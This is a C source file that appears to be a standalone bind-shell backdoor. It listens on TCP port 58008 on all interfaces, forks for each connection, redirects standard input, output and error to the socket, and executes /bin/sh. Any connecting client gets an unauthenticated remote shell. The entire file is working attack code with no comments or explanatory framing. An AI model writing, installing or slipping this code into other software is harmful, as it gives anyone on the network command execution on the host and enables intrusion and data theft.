#include <stdlib.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>

#define TCP_PORT 58008

void spawnshell(int socket_fd)
{
    dup2(socket_fd, 0);
    dup2(socket_fd, 1);
    dup2(socket_fd, 2);
    execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
}

int main(int argc, char *argv[])
{
    int sock, socket_fd, client_len;
    struct sockaddr_in server, client;

    signal(SIGCHLD, SIG_IGN);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        exit(1);
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(TCP_PORT);

    if (bind(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        exit(2);
    }

    listen(sock, 5);
    while (1)
    {
        client_len = sizeof(client);
        socket_fd = accept(sock, (struct sockaddr *)&client, &client_len);

        if (socket_fd < 0)
        {
            exit(3);
        }

        if (fork() == 0)
        {
            close(sock);
            spawnshell(socket_fd);
            exit(0);
        }
        else
            close(socket_fd);
    }
    return 0;
}
